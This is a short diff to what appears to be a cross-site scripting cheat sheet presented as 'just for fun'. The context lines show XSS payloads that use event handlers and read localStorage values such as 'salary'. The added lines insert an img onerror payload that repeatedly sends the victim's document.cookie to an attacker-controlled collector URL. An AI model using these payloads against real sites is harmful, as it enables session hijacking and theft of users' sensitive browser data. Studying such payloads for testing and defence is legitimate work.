@@ -15,6 +15,8 @@ Cross-Site-Scripting just for fun.
     - When the **<script>** is being filtered by the Web Application, you can use javascript events.
   - **<script>alert(localStorage.getItem('salary'))</script>**
     - To collect sensitive information stored in Browser Local Storage.
+  - **<img src=error onerror=this.src='http://attacker.site/collector.php?data='+document.cookie >**
+    - This payload start a loop, so the browser start sending multiple requests to the attacker server with his cookie.
 
 ## Javascript useful codes:
   - To perform HTTP GET request
